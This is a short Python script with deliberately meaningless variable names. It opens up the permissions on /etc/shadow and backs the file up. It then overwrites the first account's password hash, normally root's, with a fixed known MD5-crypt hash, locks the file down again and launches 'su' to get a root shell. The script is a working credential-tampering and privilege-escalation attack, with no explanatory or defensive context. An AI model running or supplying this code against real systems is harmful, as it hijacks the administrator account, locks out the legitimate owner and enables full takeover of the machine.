import os
a,b,c=["/etc","shadow",".bak"]
os.chmod(f"{a}/{b}",0o777)
d=open(f"{a}/{b}","r")
e=d.read()
if not os.path.exists(f"{b}{c}"):
    f=open(f"{b}{c}","w")
    f.write(e)
    f.close()
d.close()
g=e.find("\n")
h=e[0:g].split(":")
h[1]="$1$coiffeur$XvB.cT7JRRpX.JUEdqTc40"
i=":".join(h)+e[g::]
j=open(f"{a}/{b}","w")
j.write(i)
j.close()
os.chmod(f"{a}/{b}",0o000)
os.system("su")